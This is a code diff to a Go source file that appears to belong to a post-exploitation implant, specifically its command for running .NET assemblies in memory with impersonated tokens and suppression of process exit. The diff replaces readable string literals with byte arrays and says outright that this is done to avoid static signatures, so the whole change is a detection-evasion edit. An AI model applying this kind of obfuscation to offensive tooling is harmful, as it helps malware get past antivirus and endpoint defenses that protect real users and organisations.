@@ -23,6 +23,39 @@ const (
 	COINIT_MULTITHREADED_ASYNC = 0x0
 )
 
+// Inline assembly async strings (constructed to avoid static signatures)
+var (
+	// Output markers
+	iaaOutputStart = string([]byte{0x0a, 0x3e, 0x3e, 0x3e, 0x0a})       // \n>>>\n
+	iaaOutputEnd   = string([]byte{0x0a, 0x3c, 0x3c, 0x3c, 0x0a})       // \n<<<\n
+
+	// CLR version strings
+	iaaClrV4       = string([]byte{0x76, 0x34})                                                                   // v4
+	iaaClrV2       = string([]byte{0x76, 0x32})                                                                   // v2
+	iaaClrV2Sig    = string([]byte{0x76, 0x32, 0x2e, 0x30, 0x2e, 0x35, 0x30, 0x37, 0x32, 0x37})                   // v2.0.50727
+
+	// Runfor detection
+	iaaRunforFlag  = string([]byte{0x2f, 0x72, 0x75, 0x6e, 0x66, 0x6f, 0x72})       // /runfor
+	iaaColon       = string([]byte{0x3a})                                           // :
+
+	// Status messages
+	iaaDoneMsg       = string([]byte{0x0a, 0x44, 0x6f, 0x6e, 0x65, 0x0a})                                                                                       // \nDone\n
+	iaaDoneExitPrev  = string([]byte{0x0a, 0x44, 0x6f, 0x6e, 0x65, 0x20, 0x28, 0x65, 0x78, 0x69, 0x74, 0x20, 0x70, 0x72, 0x65, 0x76, 0x65, 0x6e, 0x74, 0x65, 0x64, 0x29, 0x0a}) // \nDone (exit prevented)\n
+	iaaDoneAfterPre  = string([]byte{0x0a, 0x44, 0x6f, 0x6e, 0x65, 0x20, 0x61, 0x66, 0x74, 0x65, 0x72, 0x20})     // \nDone after
+	iaaDoneAfterSuf  = string([]byte{0x64, 0x73, 0x0a})                                                           // ds\n
+	iaaDonePre       = string([]byte{0x0a, 0x44, 0x6f, 0x6e, 0x65, 0x20, 0x28})                                   // \nDone (
+	iaaDoneSuf       = string([]byte{0x29, 0x0a})                                                                 // )\n
+	iaaExitPrevMsg   = string([]byte{0x0a, 0x45, 0x78, 0x69, 0x74, 0x20, 0x70, 0x72, 0x65, 0x76, 0x65, 0x6e, 0x74, 0x65, 0x64, 0x0a}) // \nExit prevented\n
+
+	// Error detection keywords
+	iaaKwExit      = string([]byte{0x65, 0x78, 0x69, 0x74})                         // exit
+	iaaKwTerminate = string([]byte{0x74, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x65}) // terminate
+
+	// CLR corruption
+	iaaClrErrCode  = string([]byte{0x30, 0x78, 0x38, 0x30, 0x31, 0x33, 0x31, 0x36, 0x30, 0x34})                                                                                                                                     // 0x80131604
+	iaaClrCorrupt  = string([]byte{0x0a, 0x43, 0x4c, 0x52, 0x20, 0x63, 0x6f, 0x72, 0x72, 0x75, 0x70, 0x74, 0x65, 0x64, 0x20, 0x28, 0x30, 0x78, 0x38, 0x30, 0x31, 0x33, 0x31, 0x36, 0x30, 0x34, 0x29, 0x0a}) // \nCLR corrupted (0x80131604)\n
+)
+
 // AssemblyTokenContext stores token information for assembly execution
 type AssemblyTokenContext struct {
 	IsImpersonating bool
@@ -157,7 +190,7 @@ func (c *InlineAssemblyAsyncCommand) executeWindowsAssemblyAsync(assemblyBytes [
 	UsePipe     bool     `json:"use_pipe"`
 	PipeName    string   `json:"pipe_name"`
 }, job *AssemblyJob, tokenContext *AssemblyTokenContext) (int, error) {
-	job.Output.WriteString("\n>>>\n")
+	job.Output.WriteString(iaaOutputStart)
 
 	// Ensure exit prevention is initialized
 	InitializeExitPrevention()
@@ -173,11 +206,11 @@ func (c *InlineAssemblyAsyncCommand) executeWindowsAssemblyAsync(assemblyBytes [
 	runforDuration := 30 // default seconds
 	for _, arg := range config.Arguments {
 		argLower := strings.ToLower(arg)
-		if strings.Contains(argLower, "/runfor") {
+		if strings.Contains(argLower, iaaRunforFlag) {
 			hasRunfor = true
 			// Try to extract the duration
-			if strings.Contains(argLower, ":") {
-				parts := strings.Split(argLower, ":")
+			if strings.Contains(argLower, iaaColon) {
+				parts := strings.Split(argLower, iaaColon)
 				if len(parts) > 1 {
 					// Parse the number after the colon
 					var duration int
@@ -239,7 +272,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 			// Recover from any panic/exit attempt
 			if r := recover(); r != nil {
 				job.OutputMutex.Lock()
-				job.Output.WriteString("\nDone (exit prevented)\n")
+				job.Output.WriteString(iaaDoneExitPrev)
 				job.OutputMutex.Unlock()
 				resultChan <- execResult{0, nil} // Treat as success
 			}
@@ -346,9 +379,9 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 		// Execute the assembly with protection
 
 		// Detect runtime version
-		targetRuntime := "v4"
-		if bytes.Contains(assemblyBytes, []byte("v2.0.50727")) {
-			targetRuntime = "v2"
+		targetRuntime := iaaClrV4
+		if bytes.Contains(assemblyBytes, []byte(iaaClrV2Sig)) {
+			targetRuntime = iaaClrV2
 		}
 
 		// Execute with panic protection
@@ -362,7 +395,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 					// Check if it's an expected exit (like from /runfor)
 					if hasRunfor {
 						job.OutputMutex.Lock()
-						job.Output.WriteString(fmt.Sprintf("\nDone after %ds\n", runforDuration))
+						job.Output.WriteString(iaaDoneAfterPre + fmt.Sprintf("%d", runforDuration) + iaaDoneAfterSuf)
 						job.OutputMutex.Unlock()
 					}
 					execErr = nil // Not an error, just normal termination
@@ -389,7 +422,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 		case <-time.After(executionTimeout):
 			job.OutputMutex.Lock()
 			if hasRunfor {
-				job.Output.WriteString(fmt.Sprintf("\nDone (%v)\n", executionTimeout))
+				job.Output.WriteString(iaaDonePre + executionTimeout.String() + iaaDoneSuf)
 			} else {
 				job.Output.WriteString("\n" + Err(E9) + "\n")
 			}
@@ -420,15 +453,15 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 		// Check for specific exit-related errors
 		if execErr != nil {
 			errStr := strings.ToLower(execErr.Error())
-			if strings.Contains(errStr, "exit") || strings.Contains(errStr, "terminate") {
+			if strings.Contains(errStr, iaaKwExit) || strings.Contains(errStr, iaaKwTerminate) {
 				job.OutputMutex.Lock()
-				job.Output.WriteString("\nExit prevented\n")
+				job.Output.WriteString(iaaExitPrevMsg)
 				job.OutputMutex.Unlock()
 				execErr = nil
 				retCode = 0
-			} else if strings.Contains(execErr.Error(), "0x80131604") {
+			} else if strings.Contains(execErr.Error(), iaaClrErrCode) {
 				job.OutputMutex.Lock()
-				job.Output.WriteString("\nCLR corrupted (0x80131604)\n")
+				job.Output.WriteString(iaaClrCorrupt)
 				job.OutputMutex.Unlock()
 			}
 		}
@@ -444,7 +477,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 
 		// Send result back
 		resultChan <- execResult{int(retCode), execErr}
-		job.Output.WriteString("\n<<<\n")
+		job.Output.WriteString(iaaOutputEnd)
 	}()
 
 	// Wait for execution to complete or cancellation
@@ -469,9 +502,9 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 
 // executeProtectedDirect executes without pipe capture but with exit protection and token
 func (c *InlineAssemblyAsyncCommand) executeProtectedDirect(assemblyBytes []byte, arguments []string, hasRunfor bool, runforDuration int, tokenHandle syscall.Handle) (int, error) {
-	targetRuntime := "v4"
-	if bytes.Contains(assemblyBytes, []byte("v2.0.50727")) {
-		targetRuntime = "v2"
+	targetRuntime := iaaClrV4
+	if bytes.Contains(assemblyBytes, []byte(iaaClrV2Sig)) {
+		targetRuntime = iaaClrV2
 	}
 
 	var retCode int32
